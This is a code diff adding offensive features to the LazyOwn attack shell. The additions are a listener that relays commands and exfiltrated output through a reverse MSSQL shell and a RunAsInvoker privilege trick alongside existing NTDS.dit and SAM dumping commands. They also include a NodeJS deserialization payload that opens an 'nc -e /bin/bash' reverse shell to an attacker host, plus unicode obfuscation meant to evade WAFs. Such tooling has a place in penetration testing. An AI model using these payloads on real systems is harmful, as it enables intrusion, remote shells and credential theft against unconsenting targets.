@@ -22,6 +22,37 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 import cmd2
 from utils import *
 
+class MyServer(HTTPServer):
+    """
+    Custom HTTP server to handle incoming connections from certutil.
+    """
+    pass
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    """
+    Custom HTTP request handler to intercept and decode GET requests from certutil.
+    """
+    def log_request(self, *args, **kwargs):
+        return
+
+    def log_message(self, *args, **kwargs):
+        return
+
+    def do_GET(self):
+        global query_id
+        self.send_error(404)
+
+        with open('payload.json', 'r') as file:
+            data = json.load(file)
+        url = data.get('url', 'URL not found')
+        lhost = data.get('lhost', 'LHOST not found')
+        if query_id % 2 == 0:
+            output = self.path
+            if output != '/':
+                print(decode(output[1:]))
+            get_command(url, lhost)
+        query_id += 1
+
 class LazyOwnShell(cmd2.Cmd):
     """
     A custom interactive shell for the LazyOwn Framework.
@@ -5391,6 +5422,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
             ("WIN ARP Table", "arp -a"),
+            ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
             ("WIN IP Configuration", "ipconfig /all"),
             ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
             ("WIN copy sam1", "reg.exe save hklm\sam C:\sam.save"),
@@ -18208,6 +18240,90 @@ class LazyOwnShell(cmd2.Cmd):
             files['file'].close()  
 
         return
+
+    def do_unicode_WAFbypass(self, line):
+        """
+        We open a Netcat listener on port 443 and attempt to exploit NodeJS deserialization by sending the
+        following payload:
+        {"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('nc -e /bin/bash 10.10.xx.xx 443',function(error,stdout,stderr) {console.log (stdout) });\n}()"}
+        Some WAF can be bypassed with the use of unicode characters.
+
+        Generate an obfuscated payload, encode it in base64, and append the SSH public key to the authorized_keys file.
+        
+        Args:
+            ip_address (str): The IP address for the reverse shell connection.
+            port (int): The port for the reverse shell connection.
+            ssh_public_key (str): The SSH public key to add to authorized_keys.
+        
+        Returns:
+            str: The base64-encoded obfuscated payload.
+
+        """    
+        lhost = self.params["lhost"]
+        lport = str(self.params["lport"])
+        payload = '{"rce":"_$$ND_FUNC$$_function() {require(\'child_process\').exec(\'nc -e /bin/bash {lhost} {lport}\',function(error,stdout,stderr) {console.log (stdout) });\n}()"}'.replace('{lhost}',lhost).replace('{lport}',lport)
+        if not line:
+            line = input(f"    [!] Enter payload to unicode bypasswaf (default {payload}): ") or payload
+        original_payload = line.strip()
+
+
+        unicode_substitutions = {
+            "$": "\\u0024",
+            "N": "\\u004e",
+            "D": "\\u0044",
+            "F": "\\u0046",
+            "u": "\\u0075",
+            "n": "\\u006e",
+            "c": "\\u0063",
+            "(": "\\u0028",
+            ")": "\\u0029",
+            "{": "\\u007b",
+            "}": "\\u007d",
+            ".": "\\u002e",
+            "/": "\\u002f",
+            "-": "\\u002d",
+            ":": "\\u003a",
+        }
+
+        obfuscated_payload = original_payload
+        for char, unicode_value in unicode_substitutions.items():
+            obfuscated_payload = obfuscated_payload.replace(char, unicode_value)
+
+        print_msg("Payload ofuscated to bypass WAF: ")
+        print_msg(obfuscated_payload)
+        
+    def do_sqli_mssql_test(self, line):
+        """
+        Initiates a reverse MSSQL shell by starting an HTTP server to handle incoming connections and exfiltrate data.
+
+        This function does the following:
+        1. Starts an HTTP server to listen for connections from the MSSQL server.
+        2. Intercepts and decodes responses from the target server.
+        3. Prompts the user to enter commands, sends them to the target, and displays the output.
+
+        Parameters:
+        line (str): Unused command argument from the cmd2 prompt.
+
+        Returns:
+        None
+        """
+        handler = SimpleHTTPRequestHandler
+        handler.server_version = 'nginx'
+        handler.sys_version = ''
+        handler.error_message_format = 'not found'
+
+        httpd = MyServer(('0.0.0.0', 80), handler)
+        url = self.params["url"]
+        lhost = self.params["lhost"]
+        if line:
+            url = line.strip()
+        try:
+            print_msg("Starting HTTP server on port 80")
+            activate_server(httpd, url, lhost)
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print_error("Shutting down the server.")
+        httpd.server_close()
 
 if __name__ == "__main__":
     p = LazyOwnShell()
